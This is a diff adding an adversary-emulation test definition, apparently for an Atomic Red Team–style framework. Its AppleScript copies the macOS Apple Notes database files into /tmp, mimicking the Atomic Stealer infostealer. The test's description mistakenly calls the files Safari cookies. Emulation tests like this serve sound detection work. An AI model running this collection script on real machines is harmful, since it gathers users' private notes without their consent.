@@ -1,0 +1,19 @@
+name: Data from Local System
+tests:
+  - name: Copy Apple Notes database
+    description: This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.
+    reference: https://github.com/atomic-red-team/atomic-red-team/blob/master/atomics/T1539/T1539.yaml
+    language: AppleScript
+    tcc_required: true
+    command: |
+      tell application "Finder"
+        set destinationFolderPath to POSIX file "#{destination_path}"
+        set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"
+        set notesFolder to folder notesFolderPath
+        set notesFiles to {file "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder
+        repeat with aFile in notesFiles
+          duplicate aFile to folder destinationFolderPath with replacing
+        end repeat
+      end tell
+    args:
+      destination_path: "/tmp"
